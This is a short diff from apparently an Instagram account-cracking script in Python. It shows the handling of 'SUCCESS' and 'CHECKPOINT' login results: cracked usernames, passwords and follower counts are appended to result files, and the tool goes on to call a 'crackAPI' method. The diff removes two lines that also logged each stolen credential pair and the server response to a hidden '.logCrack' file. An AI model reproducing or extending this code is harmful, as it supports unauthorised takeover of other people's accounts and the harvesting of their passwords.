@@ -689,7 +689,6 @@ class instagram:
                     print('\n')
                     cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} SUCCESS {day}{H2} • {K2} • {M2} • '))
                     open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
-                    open('.logCrack','a').write(f'{H} ({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H} {H}{respon.text}\n')
                     success.append(user)
                     break
                     
@@ -702,7 +701,6 @@ class instagram:
                     cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} CHECKPOINT {day}{H2} • {K2} • {M2} • '))
                     open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                     checkpoint.append(user)
-                    open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
                     self.crackAPI(user,pas)
                     break
                 
